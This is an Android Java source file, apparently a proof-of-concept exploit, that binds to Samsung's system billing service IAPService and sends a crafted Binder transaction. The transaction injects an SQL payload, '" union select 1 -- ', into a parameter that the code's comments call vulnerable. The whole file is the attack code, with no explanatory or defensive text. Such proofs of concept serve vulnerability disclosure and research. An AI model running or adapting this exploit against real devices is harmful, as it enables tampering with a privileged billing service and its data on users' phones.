package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.sec.android.app.billing", "com.sec.android.app.billing.iap.service.IAPService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.sec.android.app.billing.iap.IAPConnector");
            parcel.writeString("\" union select 1 -- "); // vulnerable param
            parcel.writeString("evil"); // also vulnerable param

            Parcel reply = Parcel.obtain();

            binder.transact(6, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}